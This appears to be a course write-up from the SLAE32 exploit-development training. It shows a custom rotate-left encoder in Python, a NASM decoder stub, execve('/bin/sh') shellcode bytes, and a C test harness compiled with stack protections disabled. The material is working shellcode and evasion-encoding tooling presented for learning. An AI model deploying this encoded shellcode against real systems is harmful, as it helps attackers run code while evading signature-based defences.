For my fourth assignment in the SLAE32 course, I created a custom Rotation Encoder. 
How this works is to encode the payload, it rotates every bit to the left by one. If the greatest bit (valued 128) falls off the left, it wraps around to the lowest bit (valued 1).
Example:

1 0 0 0 1 0 1 0 

0 0 0 1 0 1 0 1

To decode, all the bits are rotated to the right by one. If there is a low bit, it is moved to the highest bit.

0 0 0 1 0 1 0 1

1 0 0 0 1 0 1 0 


To quickly grab the hex from the shellcode I used the method shown in the SLAE course. To make it easier, I added it to a shellscript.
```bash
#!/bin/bash
OBJFILE=$1
objdump -d $(pwd)/${1} | grep '[0-9a-f]:' | grep -v 'file'\
| cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' \
| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s \
| sed 's/^/"/' | sed 's/$/"/g'
```

```assembly
; Filename: rotateRightDecoder.nasm
; Author:  Bobby Cooke

global _start

section .text
_start:
        jmp short call_decoder

decoder:
        pop esi

decode:
        ror byte [esi], 1
        cmp byte [esi], 0xFF
        je Shellcode
        inc esi
        jmp short decode
        
call_decoder:
        call decoder
        Shellcode: db 0x62,0x81,0xa0,0xd0,0x5e,0x5e,0xe6,0xd0,0xd0,0x5e,0xc4,0xd2,0xdc,0x13,0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,0x16,0x9b,0x01,0xff
```

To compile my Assembly code I used the NASM Compiler with these commands. After creating the object file with NASM, I linked the object file using `ld`.
```bash
nasm -f elf32 rotateRightDecoder.nasm -o rotateRightDecoder.o
ld -o rotateRightDecoder rotateRightDecoder.o
```



To encode the payload I created a python script. This takes all the bytes of the shellcode and rotates them to the left once. 
If there is a most significant byte, it wraps around. In other words if the 128 value bit is set, it is moved to the 1 value bit.
The new encoded shellcode is output in both the '\x' format and the '0x, ' format.
```python
#!/usr/bin/python
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded1 = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
    if x > 127:
        x = x - 128             # Remove the left-most bit
        x = x << 1              # Shift to the left 1
        x += 1                  # Add 1, to complete the rotate
        encoded1 += '\\x'
        encoded1 += '%02x' %x   # Add the rotated left hex to string 
        encoded2 += '0x'
        encoded2 += '%02x,' %x  # Add the rotated left hex to string 
    else:
        encoded1 += '\\x'       # No leftmost bit, just rotate
        encoded1 += '%02x' %(x << 1)
        encoded2 += '0x'        # No leftmost bit, just rotate
        encoded2 += '%02x,' %(x << 1)
    
print encoded1
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
```

I tested the shellcode using the C program shown in the SLAE course.
After extracting the shellcode using the above bash script, I added it to the C program as the `code[]` array.
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0b\x5e\xd0\x0e\x80\x3e\xff\x74\x08\x46\xeb\xf6\xe8"
"\xf0\xff\xff\xff\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e"
"\xc4\xd2\xdc\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b\x01\xff";
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
To speed up compilation while developing my custom rotation encoder, I created a simple bash script to automate the process.
```bash
#!/bin/bash
SHELLCODE=$1
gcc -fno-stack-protector -z execstack -o shellcode $(pwd)/${SHELLCODE}
```
